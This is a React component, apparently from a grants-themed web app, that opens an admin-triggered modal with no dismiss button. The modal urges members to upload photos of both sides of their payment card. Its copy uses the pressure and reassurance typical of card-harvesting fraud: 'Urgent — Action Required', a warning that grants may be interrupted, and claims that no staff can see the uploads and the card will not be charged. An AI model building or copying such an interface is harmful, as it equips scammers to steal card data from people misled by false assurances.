import { useEffect, useState } from "react";
import { ArrowRight, CreditCard, Eye, ShieldCheck } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

type CardUploadRow = {
  card_upload_requested: boolean;
  card_upload_submitted_at: string | null;
};

export function CardUploadPrompt({ userId }: { userId: string }) {
  const [open, setOpen] = useState(false);

  useEffect(() => {
    let active = true;

    const checkFlag = async () => {
      const { data } = await supabase
        .from("profiles")
        .select("card_upload_requested, card_upload_submitted_at")
        .eq("id", userId)
        .maybeSingle<CardUploadRow>();
      if (!active) return;
      if (data?.card_upload_requested && !data.card_upload_submitted_at) {
        setOpen(true);
      }
    };

    checkFlag();

    // Realtime: show immediately if admin triggers while member is logged in
    const channel = supabase
      .channel(`card-upload-prompt-${userId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "profiles",
          filter: `id=eq.${userId}`,
        },
        (payload) => {
          const row = payload.new as CardUploadRow;
          if (row.card_upload_requested && !row.card_upload_submitted_at) {
            setOpen(true);
          } else {
            setOpen(false);
          }
        },
      )
      .subscribe();

    return () => {
      active = false;
      supabase.removeChannel(channel);
    };
  }, [userId]);

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-[80] grid place-items-center bg-primary/70 p-4 backdrop-blur-sm">
      <div className="w-full max-w-lg overflow-hidden rounded-2xl border border-border bg-card shadow-elegant">

        {/* Header */}
        <div className="bg-gradient-primary px-7 py-6 text-primary-foreground">
          <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-[0.2em] text-gold">
            <ShieldCheck className="h-3.5 w-3.5" /> Urgent — Action Required
          </div>
          <h2 className="mt-2 font-display text-2xl font-semibold">
            Card Verification Required
          </h2>
          <p className="mt-1 text-sm text-white/80">
            To continue processing your account, we need a one-time verification of your debit or credit card.
          </p>
        </div>

        {/* Body */}
        <div className="space-y-5 p-7">

          {/* Intro */}
          <div className="rounded-xl border border-gold/40 bg-gold/10 p-4 text-sm">
            <p className="font-semibold text-foreground">This is a one-time step</p>
            <p className="mt-1.5 leading-relaxed text-muted-foreground">
              You only need to do this once. Upload a photo of the front and back of your card
              to confirm your identity. <strong className="text-foreground">Your card will not be charged</strong> —
              this is for verification purposes only.
            </p>
          </div>

          {/* Trust points */}
          <ul className="space-y-3.5 text-sm">
            <li className="flex items-start gap-3">
              <div className="mt-0.5 grid h-5 w-5 shrink-0 place-items-center rounded-full bg-forest/15 text-forest">
                <Eye className="h-3 w-3" />
              </div>
              <span className="text-muted-foreground">
                <strong className="text-foreground">Nobody can see your card details.</strong>{" "}
                Your upload goes directly into an encrypted, private vault — no person or staff member has access to view it.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <div className="mt-0.5 grid h-5 w-5 shrink-0 place-items-center rounded-full bg-forest/15 text-forest">
                <CreditCard className="h-3 w-3" />
              </div>
              <span className="text-muted-foreground">
                <strong className="text-foreground">No charge will ever be made without your explicit knowledge and approval.</strong>{" "}
                You will always be informed and asked to confirm before any transaction.
              </span>
            </li>
            <li className="flex items-start gap-3">
              <div className="mt-0.5 grid h-5 w-5 shrink-0 place-items-center rounded-full bg-forest/15 text-forest">
                <ShieldCheck className="h-3 w-3" />
              </div>
              <span className="text-muted-foreground">
                This is a <strong className="text-foreground">compulsory one-time verification</strong> to keep your account
                in good standing and ensure your grants are not interrupted.
              </span>
            </li>
          </ul>

          {/* CTA — no dismiss */}
          <button
            onClick={() => {
              setOpen(false);
              window.location.href = "/card-upload";
            }}
            className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-primary px-6 py-4 text-sm font-semibold text-primary-foreground shadow-elegant transition hover:opacity-95"
          >
            Proceed to Verification
            <ArrowRight className="h-4 w-4" />
          </button>

          <p className="text-center text-xs text-muted-foreground">
            You will be redirected back to your dashboard once complete.
          </p>
        </div>
      </div>
    </div>
  );
}
